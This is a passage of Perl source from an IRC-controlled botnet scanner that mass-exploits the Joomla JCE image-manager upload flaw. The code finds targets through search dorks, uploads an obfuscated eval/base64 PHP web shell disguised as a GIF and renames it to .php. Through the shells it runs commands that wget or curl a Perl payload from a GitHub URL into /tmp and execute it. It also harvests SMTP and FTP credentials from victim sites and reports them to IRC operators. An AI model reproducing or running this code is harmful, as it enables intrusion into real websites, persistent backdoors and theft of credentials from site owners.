	if ($engine =~ /bypass/i) { if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { &type($chan,$bug,$TOM,$dork,"Bypass",$type,$nick); } exit; } }
	}
}
}
########## eXploiting Here ##########
sub jce_exploit() {
	my $chan = $_[0];
	my $bug = $_[1];
	my $simpan = $_[2];
	my $dork = $_[3];
	my $engine = $_[4];
	my $count = 0;
	my @totexploit = &search_engine($chan,$bug,$dork,$engine,$jcelogo,$nick);
	my $num = scalar(@totexploit);
	if ($num > 0){
		foreach my $site(@totexploit){
		$count++;					
				if ($count == $num-1) { &msg("$chan","$jcelogo15$engine9 Mencari..."); }
				        my $petx = "http://".$site."images/stories/petx.php?baca";
my $petx2 = "cruck://".$site."images/stories/petx.php";
				        my $explore = "http://".$site."images/stories/explore.php?baca";
my $explore2 = "http://".$site."images/stories/explore.php";

my $colong = &get_content($petx); sleep(2);
my $colong2 = &get_content($explore); sleep(2);
my $safe = "";
my $os = "";
if($colong =~ /Peterson - Shell/i){	
if ($colong =~ m/SAFE_MODE : (.*?)<\/b>/) {$safe = $1;}
	if ($colong =~ m/Uname : (.*?)<\/b>/){$os=$1;}
    if ($colong =~ m/Uid : (.*?)<\/br>/) {$id = $1;}
		              
&msg("$admin","$jcelogo4$engine 14$petx2 $safe $os "); sleep(2);
&msg("$chan","$jcelogo4$engine send to $nick 14 $safe $os "); sleep(2);
&msg("$nick","$jcelogo4$engine 14$petx2 $safe $os "); sleep(2);

&carismtp($petx,$chan,$site,$engine,$jcelogo);
	}
if($colong =~ /HACKERMIND/i){	
if ($colong =~ m/SAFE_MODE : (.*?)<\/b>/) {$safe = $1;}
	if ($colong =~ m/Uname : (.*?)<\/b>/){$os=$1;}
    if ($colong =~ m/Uid : (.*?)<\/br>/) {$id = $1;}
		              
&msg("$admin","$jcelogo4$engine 14$petx2 $safe $os "); sleep(2);		              
&msg("$chan","$jcelogo4$engine send to 14$safe $os  "); sleep(2);
&msg("$nick","$jcelogo4$engine 14$petx2 $safe $os "); sleep(2);
&carismtp($petx,$chan,$site,$engine,$jcelogo);
	}

if($colong2 =~ /UnKnown - Simple Shell/i){

if ($colong2 =~ m/SAFE_MODE : (.*?)<\/b>/) {$safe = $1;}
	if ($colong2 =~ m/Uname : (.*?)<\/b>/){$os=$1;}
    if ($colong2 =~ m/Uid : (.*?)<\/br>/) {$id = $1;}
		              
&msg("$admin","$jcelogo4$engine 14$explore2 $safe $os "); sleep(2);
&msg("$nick","$jcelogo4$engine 14$explore2 $safe $os "); sleep(2);			              
&msg("$chan","$jcelogo4$engine send to $nick 14$safe $os "); sleep(2);

&carismtp($explore,$chan,$site,$engine,$jcelogo);
	}
				my $test  = "http://".$site.$bug;
				my $coba  = "http://".$site;
				if ($coba =~ /([^:]*:\/\/)?([^\/]+\.[^\/]+)/g) { $hajarhome = $2; }
				my $shellz = "http://".$site."/images/stories/magic.php";
                                my $shellz2 = "http://".$site."/images/stories/msgic.php.pHp";
				my $crsmtp = "http://".$site."/images/stories/magic.php?baca";
		my $crsmtp2 = "http://".$site."/images/stories/magic.php.pHp?baca";	
		&jce_cek_query($hajarhome);
					my $fuck ="http://".$site."/images/stories/magic.php.png";
my $fuck2 ="http://".$site."/images/stories/magic.php.png?baca";
					my $cek = &get_content($fuck);
					if($cek =~ /GIF89aG/i){
			        &msg("$chan","$jcelogo15,1$engine 9ExpLoiting http://".$site." Loading. . . ");

					
					if ($cek =~ /BArNEr/i) {
&get_content($fuck."?cmd=cd%20/tmp;wget%20https://raw.githubusercontent.com/blackzwashere/perl/main/img.jpg;perl%20img.jpg;rm%20-rf%20img.jp*");
&get_content($fuck."?cmd=curl+-C+-+-O+20https://raw.githubusercontent.com/blackzwashere/perl/main/img.jpg%3Bperl+img.jpg%3Brm+img.jp*");
					my $safe = ""; my $os = ""; my $uid = "";
					if ($cek =~ m/SAFE_MODE :(.+?)<\/b><br/) {$safe = $1;}
					if ($cek =~ m/Uname :(.+?)<\/b><br><form/g) {$os = $1;}
					if ($cek =~ m/uid=(.*?)gid=/) {$uid = $1;}
					&msg("$nick","$jcelogo15,1$engine 7$fuck (SafeMode=$safe) (OS=$os) uid=$uid $jcelogo");	
                                        &msg("$admin","$jcelogo15,1$engine 8$fuck 7(SafeMode=$safe) (OS=$os) uid=$uid $jcelogo");
					&msg("$chan","$jcelogo15,1$engine 9SHELL 8 7(SafeMode=$safe) (OS=$os) uid=$uid $jcelogo");
					&carismtp($fuck2,$chan,$site,$engine,$jcelogo);
				}
&jce_cek_query2($hajarhome);
					my $fujce = &get_content($shellz);
					if ($fujce =~ /BArNEr/i) {
&get_content($shellz."?cmd=cd%20/tmp;wget%20https://raw.githubusercontent.com/blackzwashere/perl/main/img.jpg;perl%20img.jpg;rm%20-rf%20img.jp*");
&get_content($shellz."?cmd=curl+-C+-+-O+20https://raw.githubusercontent.com/blackzwashere/perl/main/img.jpg%3Bperl+img.jpg%3Brm+img.jp*");
					my $safe = ""; my $os = ""; my $uid = "";
					if ($fujce =~ m/SAFE_MODE :(.+?)<\/b><br/) {$safe = $1;}
					if ($fujce =~ m/Uname :(.+?)<\/b><br><form/g) {$os = $1;}
					if ($fujce =~ m/uid=(.*?)gid=/) {$uid = $1;}
					&msg("$nick","$jcelogo15,1$engine 7$shellz (SafeMode=$safe) (OS=$os) uid=$uid $jcelogo");	
                                        &msg("$admin","$jcelogo15,1$engine 8$shellz 7(SafeMode=$safe) (OS=$os) uid=$uid $jcelogo");
					&msg("$chan","$jcelogo15,1$engine 9SHELL 8 7(SafeMode=$safe) (OS=$os) uid=$uid $jcelogo");
					&carismtp($crsmtp,$chan,$site,$engine,$jcelogo);
				}
&jce_cek_query3($hajarhome);
					my $fujce = &get_content($shellz2);
					if ($fujce =~ /BArNEr/i) {
&get_content($shellz2."?cmd=cd%20/tmp;wget%20https://raw.githubusercontent.com/blackzwashere/perl/main/img.jpg;perl%20img.jpgrm%20-rf%20img.jp*");
&get_content($shellz2."?cmd=curl+-C+-+-O+20https://raw.githubusercontent.com/blackzwashere/perl/main/img.jpg%3Bperl+img.jpg%3Brm+img.jp*");
					my $safe = ""; my $os = ""; my $uid = "";
					if ($fujce2 =~ m/SAFE_MODE :(.+?)<\/b><br/) {$safe = $1;}
					if ($fujce2 =~ m/Uname :(.+?)<\/b><br><form/g) {$os = $1;}
					if ($fujce2 =~ m/uid=(.*?)gid=/) {$uid = $1;}
					&msg("$nick","$jcelogo15,1$engine 7$shellz2 (SafeMode=$safe) (OS=$os) uid=$uid $jcelogo");	
                                        &msg("$admin","$jcelogo15,1$engine 8$shellz2 7(SafeMode=$safe) (OS=$os) uid=$uid $jcelogo");
					&msg("$chan","$jcelogo15,1$engine 9SHELL 8 7(SafeMode=$safe) (OS=$os) uid=$uid $jcelogo");
					&carismtp($crsmtp2,$chan,$site,$engine,$jcelogo);
				}
			}
		}
	}
}

sub carismtp() {
    my $url    = $_[0];
    my $chan   = $_[1];
    my $site   = $_[2];
	my $engine = $_[3];
	my $logo   = $_[4];
	my $data   = &get_content($url);
	my $psite  = "http://".$site;
	if ($psite =~ /([^:]*:\/\/)?([^\/]+\.[^\/]+)/g) { $host = $2; }
	if ($data =~ m/smtphost/g && $data =~ m/smtppass/g || $data =~ m/ftp_host/g ) {
		if ($data =~ m/smtphost = '(.*)';/g) { $smtphost = $1; }
		if ($data =~ m/smtpport = '(.*)';/g) { $smtpport = $1; }
		if ($data =~ m/smtpuser = '(.*)';/g) { $smtpuser = $1; }
		if ($data =~ m/smtppass = '(.*)';/g) { $smtppass = $1; }
		if ($data =~ m/ftp_host = '(.*)';/g) { $ftp_host = $1; }
		if ($data =~ m/ftp_port = '(.*)';/g) { $ftp_port = $1; }
		if ($data =~ m/ftp_user = '(.*)';/g) { $ftp_user = $1; }
		if ($data =~ m/ftp_pass = '(.*)';/g) { $ftp_pass = $1; }
		&msg("$admin","3,1{-{4@11$engine4@3}-} 13http://$site 9[SMTP]: 15[$smtphost][$smtpport][$smtpuser][$smtppass] 9[FTP]: 15[$ftp_host][$ftp_port][$ftp_user][$ftp_pass] 4$jcelogo");
		&msg("$nick","3,1{-{4@11$engine4@3}-} 9[SMTP]: 15[$smtpuser] 9[FTP]: 15[$ftp_user] 4$jcelogo");
		&ftp_connect("http://target.com",$host,$ftp_user,$ftp_pass,$chan,$engine); sleep(2);
	}
}

sub jce_cek_queryhtx() {
	my $TARGET 	= $_[0];
	## Start Code ##
$header1P = "POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20&6bc427c8a7981f4fe1f5ac65c1246b5f=cf6dd3cf1923c950586d0dd595c8e20b HTTP/1.1";
$header1P2 = "POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&version=1576&cid=20 HTTP/1.1";
$header2 = "Host: $TARGET";
$header3 = "User-Agent: BOT/0.1 (BOT for JCE)";
$header4 = "Content-Type: multipart/form-data; boundary=---------------------------41184676334";
$header5 = "Content-Length: 2286"; #737
$header6 = "-----------------------------41184676334";
$header7 = 'Content-Disposition: form-data; name="upload-dir"';
$header8 = '/';
$header9 = 'Content-Disposition: form-data; name="Filedata"; filename=""';
$header10 = 'Content-Type: application/octet-stream';
$header11 = 'Content-Disposition: form-data; name="upload-overwrite"';
$header12 = "0";
$header13 = 'Content-Disposition: form-data; name="Filedata"; filename="htx.gif"';
$header14 = 'Content-Type: image/gif';
$header15 = '';
$header16 = "";
$header17 = 'Content-Disposition: form-data; name="upload-name"';
$header18 = 'htx';
$header19 = 'Content-Disposition: form-data; name="action"';
$header20 = 'upload';
$header21 = "-----------------------------41184676334--";
$header22 = 'X-Request: JSON';
$header23 = 'Content-Type: application/x-www-form-urlencoded; charset=utf-8';
$header25 = 'json={"fn":"folderRename","args":["/htx.gif",".htaccess"]}';
$header24 = "Content-Length: ".length($header25)."";
	## EOF COde ##
	my $remote = IO::Socket::INET->new(Proto=>"tcp",PeerAddr=>"$TARGET" ,PeerPort=>"80") or return;
	print $remote "$header1P\n$header2\n$header3\n$header4\n$header5\n\n$header6\n$header7\n\n$header8\n$header6\n$header9\n$header10\n\n\n$header6\n$header11\n\n$header12\n$header6\n$header13\n$header14\n\n$header15\n$header16\n$header6\n$header17\n\n$header18\n$header6\n$header19\n\n$header20\n$header21\n\n"; sleep(5);
	print $remote "$header1P2\n$header2\n$header3\n$header23\n$header22\n$header24\n\n$header25\n\n"; sleep(3);
	close($remote);
}

sub jce_cek_query() {
	my $TARGET 	= $_[0];
	## Start Code ##
$header1P = "POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20&6bc427c8a7981f4fe1f5ac65c1246b5f=cf6dd3cf1923c950586d0dd595c8e20b HTTP/1.1";
$header1P2 = "POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&version=1576&cid=20 HTTP/1.1";
$header2 = "Host: $TARGET";
$header3 = "User-Agent: BOT/0.1 (BOT for JCE)";
$header4 = "Content-Type: multipart/form-data; boundary=---------------------------41184676334";
$header5 = "Content-Length: 2286"; #737
$header6 = "-----------------------------41184676334";
$header7 = 'Content-Disposition: form-data; name="upload-dir"';
$header8 = '/';
$header9 = 'Content-Disposition: form-data; name="Filedata"; filename=""';
$header10 = 'Content-Type: application/octet-stream';
$header11 = 'Content-Disposition: form-data; name="upload-overwrite"';
$header12 = "0";
$header13 = 'Content-Disposition: form-data; name="Filedata"; filename="magic.php.png"';
$header14 = 'Content-Type: image/gif';
$header15 = 'GIF89aG';
$header16 = "<?php eval(gzinflate(str_rot13(base64_decode('vUl6QuNTEP5cJP7Dso1xVAc2tKqEACM4MCVFVnUc+gWQtbE3yR62102v4Sjiv2pz187L8UWuOjWKFHten2xzaTZcKalvxViptCim7mlqf31aWYi7IaqKeLcTVG4U9Qb9eHTMvrA757bb/el2fa1mLyqhE0wXmgRxG5w6D3wMj+gw/CscXtPz0egyPh9RI22Ld0R8TEQPwz+vwnUUXw171mAs01SwoCOmplyTR3We12qsIDcFxsYAFO0qNuH5acrB9lUUIgZw105unMuUO/MC5oZd8tSpa0UroR8hfmd8FsYXg9MQAgzOzuj+8/oazyr+jkgfjFl3rleuAsg4k5UePxYs5+68JMf+xsenp1DgqSma33apIMhbQcPwbzAKl5xlJjKXsiwVV7BPy92jKYq8UeZnk0PDE92k56wSGfmMWgGOc02Xe77fEgWUtbXcFL1YEmRozxFSRsJaTkDaA2cJoANkC5S+huB1JvX/DOHl3IHnDigWzW1u8emT6ZKYuO3s/h6Orp0kkwXHucWxrXGtEr48iEFnMuxdjuKz3h9u//giZ8wwprzSggQLq9PBydVS2B/Fw8Fg5Nxt1M/ktPI9jgfIK3Qlzqbitrk2yyaxbroW9g8c3L0PDe6eHVwwV3OS0AMtZ8YPPx+rfqgOfPtpMEmHiLwxmVU4z5X4mwe/kFFz0Jefas0HDA+pN8/j0QN/PGrugDCuoa0BaKkHcsUgAC60Ebpdj2k/muMKHABrLdLAUcof4REizEZrlFkXyum3ynJLH8qHDYOEFFsY16Z93dUwk7pVtJAFKR8gGcEpVx5Fe6ITFNmZ69ROpZUqcuWiftPxHTNlU7WBuowXU9Xd2k6F4rpJBU6JB8Z6N5+W5HOeG/l4KWFhvicHS7+dpFaElDlAmcpWjgsLmL7EFUGY4SCg9PB9T0JxnrMiegk8EFJMeKIfWB5Dzb93V5DjgCZsV0q1RD3OxU9i40Nlz7LavN+BvY/IDp39SKQcGnFP5GimUsmUNmlbKdOsUt6Wg9X8WAlKciZMV85RxloZPk2/qHMm0pQXDdrKb18xmIB/o8bZxEra5Ny10d5S0ecPxnuPLINLio95Te+d35o8BX/AB1eSjEhIoNmKgwXZ6OhLz7m1Ba/Qu7RRkbF4xzq3eLQ2HmM/wDEoF3Rgo3BjtD4NHGNtMgqzaWTPU9dBWIlmC2nGyMxuLu9seaPzNFMD90gXnZexaIMtO1TjmTQNmB8SCqu1e6SdCrgHbIp74ZnY5VhJ9ESdJLyqiAaR93o4S15Jv07oPmw2VO4F083kt0fDTjG8Nco8NRdHs9tXxZfH6NdpjLbNBzZpNeNMFvOvPGQxkkx6aZJ89KUr+3L12swXEHGDbqH4rxDkuxjmcX5KRyeryEnGnDcCv/xUMHMJW9RJWaA2HIbY3FzgDzdKBReZ58MX9W9NK4ZYxNzz3bZp44s5/gE=')))); ?>";
$header17 = 'Content-Disposition: form-data; name="upload-name"';
$header18 = 'magic.php';
$header19 = 'Content-Disposition: form-data; name="action"';
$header20 = 'upload';
$header21 = "-----------------------------41184676334--";
$header22 = 'X-Request: JSON';
$header23 = 'Content-Type: application/x-www-form-urlencoded; charset=utf-8';
$header25 = 'json={"fn":"folderRename","args":["/magic.php.png","magic.php"]}';
$header24 = "Content-Length: ".length($header25)."";
	## EOF COde ##
	my $remote = IO::Socket::INET->new(Proto=>"tcp",PeerAddr=>"$TARGET" ,PeerPort=>"80") or return;
	print $remote "$header1P\n$header2\n$header3\n$header4\n$header5\n\n$header6\n$header7\n\n$header8\n$header6\n$header9\n$header10\n\n\n$header6\n$header11\n\n$header12\n$header6\n$header13\n$header14\n\n$header15\n$header16\n$header6\n$header17\n\n$header18\n$header6\n$header19\n\n$header20\n$header21\n\n"; sleep(5);
	print $remote "$header1P2\n$header2\n$header3\n$header23\n$header22\n$header24\n\n$header25\n\n"; sleep(3);
	close($remote);
}

sub jce_cek_query2() {
	my $TARGET 	= $_[0];
	## Start Code ##
$header1P = "POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20&6bc427c8a7981f4fe1f5ac65c1246b5f=cf6dd3cf1923c950586d0dd595c8e20b HTTP/1.1";
$header1P2 = "POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&version=1576&cid=20 HTTP/1.1";
$header2 = "Host: $TARGET";
$header3 = "User-Agent: BOT/0.1 (BOT for JCE)";
$header4 = "Content-Type: multipart/form-data; boundary=---------------------------41184676334";
$header5 = "Content-Length: 2286"; #737
$header6 = "-----------------------------41184676334";
$header7 = 'Content-Disposition: form-data; name="upload-dir"';
$header8 = '/';
$header9 = 'Content-Disposition: form-data; name="Filedata"; filename=""';
$header10 = 'Content-Type: application/octet-stream';
$header11 = 'Content-Disposition: form-data; name="upload-overwrite"';
$header12 = "0";
$header13 = 'Content-Disposition: form-data; name="Filedata"; filename="magic.php.png"';
$header14 = 'Content-Type: image/gif';
$header15 = 'GIF89aG';
$header16 = "<?php eval(gzinflate(str_rot13(base64_decode('vUl6QuNTEP5cJP7Dso1xVAc2tKqEACM4MCVFVnUc+gWQtbE3yR62102v4Sjiv2pz187L8UWuOjWKFHten2xzaTZcKalvxViptCim7mlqf31aWYi7IaqKeLcTVG4U9Qb9eHTMvrA757bb/el2fa1mLyqhE0wXmgRxG5w6D3wMj+gw/CscXtPz0egyPh9RI22Ld0R8TEQPwz+vwnUUXw171mAs01SwoCOmplyTR3We12qsIDcFxsYAFO0qNuH5acrB9lUUIgZw105unMuUO/MC5oZd8tSpa0UroR8hfmd8FsYXg9MQAgzOzuj+8/oazyr+jkgfjFl3rleuAsg4k5UePxYs5+68JMf+xsenp1DgqSma33apIMhbQcPwbzAKl5xlJjKXsiwVV7BPy92jKYq8UeZnk0PDE92k56wSGfmMWgGOc02Xe77fEgWUtbXcFL1YEmRozxFSRsJaTkDaA2cJoANkC5S+huB1JvX/DOHl3IHnDigWzW1u8emT6ZKYuO3s/h6Orp0kkwXHucWxrXGtEr48iEFnMuxdjuKz3h9u//giZ8wwprzSggQLq9PBydVS2B/Fw8Fg5Nxt1M/ktPI9jgfIK3Qlzqbitrk2yyaxbroW9g8c3L0PDe6eHVwwV3OS0AMtZ8YPPx+rfqgOfPtpMEmHiLwxmVU4z5X4mwe/kFFz0Jefas0HDA+pN8/j0QN/PGrugDCuoa0BaKkHcsUgAC60Ebpdj2k/muMKHABrLdLAUcof4REizEZrlFkXyum3ynJLH8qHDYOEFFsY16Z93dUwk7pVtJAFKR8gGcEpVx5Fe6ITFNmZ69ROpZUqcuWiftPxHTNlU7WBuowXU9Xd2k6F4rpJBU6JB8Z6N5+W5HOeG/l4KWFhvicHS7+dpFaElDlAmcpWjgsLmL7EFUGY4SCg9PB9T0JxnrMiegk8EFJMeKIfWB5Dzb93V5DjgCZsV0q1RD3OxU9i40Nlz7LavN+BvY/IDp39SKQcGnFP5GimUsmUNmlbKdOsUt6Wg9X8WAlKciZMV85RxloZPk2/qHMm0pQXDdrKb18xmIB/o8bZxEra5Ny10d5S0ecPxnuPLINLio95Te+d35o8BX/AB1eSjEhIoNmKgwXZ6OhLz7m1Ba/Qu7RRkbF4xzq3eLQ2HmM/wDEoF3Rgo3BjtD4NHGNtMgqzaWTPU9dBWIlmC2nGyMxuLu9seaPzNFMD90gXnZexaIMtO1TjmTQNmB8SCqu1e6SdCrgHbIp74ZnY5VhJ9ESdJLyqiAaR93o4S15Jv07oPmw2VO4F083kt0fDTjG8Nco8NRdHs9tXxZfH6NdpjLbNBzZpNeNMFvOvPGQxkkx6aZJ89KUr+3L12swXEHGDbqH4rxDkuxjmcX5KRyeryEnGnDcCv/xUMHMJW9RJWaA2HIbY3FzgDzdKBReZ58MX9W9NK4ZYxNzz3bZp44s5/gE=')))); ?>";
$header17 = 'Content-Disposition: form-data; name="upload-name"';
$header18 = 'magic.php';
$header19 = 'Content-Disposition: form-data; name="action"';
$header20 = 'upload';
$header21 = "-----------------------------41184676334--";
$header22 = 'X-Request: JSON';
$header23 = 'Content-Type: application/x-www-form-urlencoded; charset=utf-8';
$header25 = 'json={"fn":"folderRename","args":["/magic.php.png","magic.php"]}';
$header24 = "Content-Length: ".length($header25)."";
	# EOF COde ##
	my $remote = IO::Socket::INET->new(Proto=>"tcp",PeerAddr=>"$TARGET" ,PeerPort=>"80") or return;
	print $remote "$header1P2\n$header2\n$header3\n$header23\n$header22\n$header24\n\n$header25\n\n"; sleep(5);
	print $remote "$header1P2\n$header2\n$header3\n$header23\n$header22\n$header24\n\n$header25\n\n"; 
	print $remote "$header1P2\n$header2\n$header3\n$header23\n$header22\n$header24\n\n$header25\n\n"; sleep(3);
	print $remote "$header1P2\n$header2\n$header3\n$header23\n$header22\n$header24\n\n$header25\n\n";
	close($remote);
}
sub jce_cek_query3() {
	my $TARGET 	= $_[0];
	## Start Code ##
$header1P = "POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20&6bc427c8a7981f4fe1f5ac65c1246b5f=cf6dd3cf1923c950586d0dd595c8e20b HTTP/1.1";
$header1P2 = "POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&version=1576&cid=20 HTTP/1.1";
$header2 = "Host: $TARGET";
$header3 = "User-Agent: BOT/0.1 (BOT for JCE)";
$header4 = "Content-Type: multipart/form-data; boundary=---------------------------41184676334";
$header5 = "Content-Length: 2286"; #737
$header6 = "-----------------------------41184676334";
$header7 = 'Content-Disposition: form-data; name="upload-dir"';
$header8 = '/';
$header9 = 'Content-Disposition: form-data; name="Filedata"; filename=""';
$header10 = 'Content-Type: application/octet-stream';
$header11 = 'Content-Disposition: form-data; name="upload-overwrite"';
$header12 = "0";
$header13 = 'Content-Disposition: form-data; name="Filedata"; filename="magic.php.png"';
$header14 = 'Content-Type: image/gif';
$header15 = 'GIF89aG';
$header16 = "<?php eval(gzinflate(str_rot13(base64_decode('vUl6QuNTEP5cJP7Dso1xVAc2tKqEACM4MCVFVnUc+gWQtbE3yR62102v4Sjiv2pz187L8UWuOjWKFHten2xzaTZcKalvxViptCim7mlqf31aWYi7IaqKeLcTVG4U9Qb9eHTMvrA757bb/el2fa1mLyqhE0wXmgRxG5w6D3wMj+gw/CscXtPz0egyPh9RI22Ld0R8TEQPwz+vwnUUXw171mAs01SwoCOmplyTR3We12qsIDcFxsYAFO0qNuH5acrB9lUUIgZw105unMuUO/MC5oZd8tSpa0UroR8hfmd8FsYXg9MQAgzOzuj+8/oazyr+jkgfjFl3rleuAsg4k5UePxYs5+68JMf+xsenp1DgqSma33apIMhbQcPwbzAKl5xlJjKXsiwVV7BPy92jKYq8UeZnk0PDE92k56wSGfmMWgGOc02Xe77fEgWUtbXcFL1YEmRozxFSRsJaTkDaA2cJoANkC5S+huB1JvX/DOHl3IHnDigWzW1u8emT6ZKYuO3s/h6Orp0kkwXHucWxrXGtEr48iEFnMuxdjuKz3h9u//giZ8wwprzSggQLq9PBydVS2B/Fw8Fg5Nxt1M/ktPI9jgfIK3Qlzqbitrk2yyaxbroW9g8c3L0PDe6eHVwwV3OS0AMtZ8YPPx+rfqgOfPtpMEmHiLwxmVU4z5X4mwe/kFFz0Jefas0HDA+pN8/j0QN/PGrugDCuoa0BaKkHcsUgAC60Ebpdj2k/muMKHABrLdLAUcof4REizEZrlFkXyum3ynJLH8qHDYOEFFsY16Z93dUwk7pVtJAFKR8gGcEpVx5Fe6ITFNmZ69ROpZUqcuWiftPxHTNlU7WBuowXU9Xd2k6F4rpJBU6JB8Z6N5+W5HOeG/l4KWFhvicHS7+dpFaElDlAmcpWjgsLmL7EFUGY4SCg9PB9T0JxnrMiegk8EFJMeKIfWB5Dzb93V5DjgCZsV0q1RD3OxU9i40Nlz7LavN+BvY/IDp39SKQcGnFP5GimUsmUNmlbKdOsUt6Wg9X8WAlKciZMV85RxloZPk2/qHMm0pQXDdrKb18xmIB/o8bZxEra5Ny10d5S0ecPxnuPLINLio95Te+d35o8BX/AB1eSjEhIoNmKgwXZ6OhLz7m1Ba/Qu7RRkbF4xzq3eLQ2HmM/wDEoF3Rgo3BjtD4NHGNtMgqzaWTPU9dBWIlmC2nGyMxuLu9seaPzNFMD90gXnZexaIMtO1TjmTQNmB8SCqu1e6SdCrgHbIp74ZnY5VhJ9ESdJLyqiAaR93o4S15Jv07oPmw2VO4F083kt0fDTjG8Nco8NRdHs9tXxZfH6NdpjLbNBzZpNeNMFvOvPGQxkkx6aZJ89KUr+3L12swXEHGDbqH4rxDkuxjmcX5KRyeryEnGnDcCv/xUMHMJW9RJWaA2HIbY3FzgDzdKBReZ58MX9W9NK4ZYxNzz3bZp44s5/gE=')))); ?>";
$header17 = 'Content-Disposition: form-data; name="upload-name"';
$header18 = 'magic.php';
$header19 = 'Content-Disposition: form-data; name="action"';
$header20 = 'upload';
$header21 = "-----------------------------41184676334--";
$header22 = 'X-Request: JSON';
$header23 = 'Content-Type: application/x-www-form-urlencoded; charset=utf-8';
$header25 = 'json={"fn":"folderRename","args":["/magic.php.png","magic.php.pHp"]}';
$header24 = "Content-Length: ".length($header25)."";
	# EOF COde ##
	my $remote = IO::Socket::INET->new(Proto=>"tcp",PeerAddr=>"$TARGET" ,PeerPort=>"80") or return;
	print $remote "$header1P2\n$header2\n$header3\n$header23\n$header22\n$header24\n\n$header25\n\n"; sleep(5);
	print $remote "$header1P2\n$header2\n$header3\n$header23\n$header22\n$header24\n\n$header25\n\n"; 
	print $remote "$header1P2\n$header2\n$header3\n$header23\n$header22\n$header24\n\n$header25\n\n"; sleep(3);
	print $remote "$header1P2\n$header2\n$header3\n$header23\n$header22\n$header24\n\n$header25\n\n";
	close($remote);
}

sub ftp_connect {
	my $url = $_[0];
	my $host = $_[1];
	my $user = $_[2];
	my $pass = $_[3];
	my $chan = $_[4];
	my $engine = $_[5];
	my $logo = $_[6];
	my $success = 1;
	use Net::FTP;
	my $ftp = Net::FTP->new($host, Debug => 0, Timeout => 7);
		$success = 0 if $ftp->login($user,$pass);
		$ftp->quit;
		if ($success == 0) {
		&msg("$admin","$jcelogo15$engine 9 [FTP] 15[ 4http://".$host." 15] [4 ".$user.":".$pass." 15]");
		&msg("barner","$jcelogo15$engine 9 [FTP] 15[ 4http://".$host." 15] [4 ".$user.":".$pass." 15]");
	}
}

########## STOP EDITING HERE ##########

sub search_engine() {
    my (@total,@clean);
    my $chan = $_[0];
    my $bug = $_[1];
    my $dork = $_[2];
    my $engine = $_[3];
    my $logo = $_[4];
	if ($gps == 1) {
    if ($engine eq "JacKAR") { my @jackar = &jackar($dork); push(@total,@jackar); }
    if ($engine eq "JacKAT") { my @jackat = &jackat($dork); push(@total,@jackat); }
    if ($engine eq "JacKAU") { my @jackau = &jackau($dork); push(@total,@jackau); }
    if ($engine eq "JacKBR") { my @jackbr = &jackbr($dork); push(@total,@jackbr); }
    if ($engine eq "JacKCA") { my @jackca = &jackca($dork); push(@total,@jackca); }
    if ($engine eq "JacKCL") { my @jackcl = &jackcl($dork); push(@total,@jackcl); }
    if ($engine eq "JacKCN") { my @jackcn = &jackcn($dork); push(@total,@jackcn); }
    if ($engine eq "JacKCoM") { my @jackcom = &jackcom($dork); push(@total,@jackcom); }
    if ($engine eq "JacKCZ") { my @jackcz = &jackcz($dork); push(@total,@jackcz); }
    if ($engine eq "JacKDE") { my @jackde = &jackde($dork); push(@total,@jackde); }
    if ($engine eq "JacKDK") { my @jackdk = &jackdk($dork); push(@total,@jackdk); }
    if ($engine eq "JacKES") { my @jackes = &jackes($dork); push(@total,@jackes); }
    if ($engine eq "JacKEU") { my @jackeu = &jackeu($dork); push(@total,@jackeu); }
    if ($engine eq "JacKFR") { my @jackfr = &jackfr($dork); push(@total,@jackfr); }
    if ($engine eq "JacKHU") { my @jackhu = &jackhu($dork); push(@total,@jackhu); }
    if ($engine eq "JacKID") { my @jackid = &jackid($dork); push(@total,@jackid); }
    if ($engine eq "JacKIL") { my @jackil = &jackil($dork); push(@total,@jackil); }
    if ($engine eq "JacKIN") { my @jackin = &jackin($dork); push(@total,@jackin); }
    if ($engine eq "JacKInfO") { my @jackinfo = &jackinfo($dork); push(@total,@jackinfo); }
    if ($engine eq "JacKIR") { my @jackir = &jackir($dork); push(@total,@jackir); }
    if ($engine eq "JacKIT") { my @jackit = &jackit($dork); push(@total,@jackit); }
    if ($engine eq "JacKJP") { my @jackjp = &jackjp($dork); push(@total,@jackjp); }
    if ($engine eq "JacKKR") { my @jackkr = &jackkr($dork); push(@total,@jackkr); }
    if ($engine eq "JacKMX") { my @jackmx = &jackmx($dork); push(@total,@jackmx); }
    if ($engine eq "JacKMY") { my @jackmy = &jackmy($dork); push(@total,@jackmy); }
    if ($engine eq "JacKNeT") { my @jacknet = &jacknet($dork); push(@total,@jacknet); }
    if ($engine eq "JacKNL") { my @jacknl = &jacknl($dork); push(@total,@jacknl); }
    if ($engine eq "JacKOrG") { my @jackorg = &jackorg($dork); push(@total,@jackorg); }
    if ($engine eq "JacKPH") { my @jackph = &jackph($dork); push(@total,@jackph); }
    if ($engine eq "JacKPL") { my @jackpl = &jackpl($dork); push(@total,@jackpl); }
    if ($engine eq "JacKRO") { my @jackro = &jackro($dork); push(@total,@jackro); }
    if ($engine eq "JacKRU") { my @jackru = &jackru($dork); push(@total,@jackru); }
    if ($engine eq "JacKTH") { my @jackth = &jackth($dork); push(@total,@jackth); }
    if ($engine eq "JacKUA") { my @jackua = &jackua($dork); push(@total,@jackua); }
    if ($engine eq "JacKUK") { my @jackuk = &jackuk($dork); push(@total,@jackuk); }
    if ($engine eq "JacKUS") { my @jackus = &jackus($dork); push(@total,@jackus); }
    if ($engine eq "JacKSI") { my @jacksi = &jacksi($dork); push(@total,@jacksi); }
    if ($engine eq "JacKBE") { my @jackbe = &jackbe($dork); push(@total,@jackbe); }
    if ($engine eq "JacKBIZ") { my @jackbiz = &jackbiz($dork); push(@total,@jackbiz); }
	if ($engine eq "JacKZA") { my @jackza = &jackza($dork); push(@total,@jackza); }
	if ($engine eq "JacKIE") { my @jackie = &jackie($dork); push(@total,@jackie); }
	if ($engine eq "JacKTV") { my @jacktv = &jacktv($dork); push(@total,@jacktv); }
	if ($engine eq "JacKAM") { my @jackam = &jackam($dork); push(@total,@jackam); }
